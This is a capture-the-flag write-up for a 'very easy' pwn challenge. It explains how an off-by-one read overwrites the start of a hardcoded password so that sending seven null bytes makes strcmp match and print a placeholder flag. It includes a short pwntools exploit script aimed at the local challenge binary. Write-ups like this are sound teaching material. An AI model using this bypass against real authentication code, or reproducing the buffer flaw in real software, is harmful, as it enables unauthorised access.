# Writing-on-the-Wall — Writeup

**Difficulty**: Very Easy
**Category**: Pwn
**Vulnerability**: Off-by-one buffer overflow + `strcmp` null-byte truncation
**Protections**: Full RELRO, Canary, NX, PIE (all enabled)

## Vulnerability

`main()` allocates a 6-byte stack buffer (`local_1e`) immediately followed by an 8-byte hardcoded password string (`local_18 = "w3tpass "`). The program calls `read(0, local_1e, 7)`, writing 7 bytes into a 6-byte buffer — an **off-by-one** overflow that clobbers the first byte of the adjacent password string.

```
Stack layout:
  rbp-0x16 → local_1e[6]   (user input, 6 bytes allocated)
  rbp-0x10 → local_18      ("w3tpass " in little-endian: 0x2073736170743377)
  rbp-0x08 → canary
```

The 7th byte of input overwrites the `'w'` (0x77) at the start of `local_18`.

## Exploit

`strcmp()` stops comparing at the first null byte. Send 7 null bytes:

1. `local_1e` becomes `""` (null at index 0)
2. `local_18` starts with `\x00` → also seen as `""`
3. `strcmp("", "")` → `0` → `open_door()` called → flag printed

No canary corruption occurs (overflow is only 1 byte, canary is 8 bytes away at rbp-0x08).

## Exploit Code

```python
from pwn import *

CHALLENGE_DIR = 'challenge'
BINARY = f'{CHALLENGE_DIR}/writing_on_the_wall'
LIBC_DIR = f'{CHALLENGE_DIR}/glibc/'

p = process(
    [f'{LIBC_DIR}/ld-linux-x86-64.so.2', '--library-path', LIBC_DIR, BINARY],
    cwd=CHALLENGE_DIR,
)

p.recvuntil(b'>>')
p.sendline(b'\x00' * 7)
print(p.recvall().decode())
```

## Flag

`HTB{f4k3_fl4g_4_t35t1ng}`
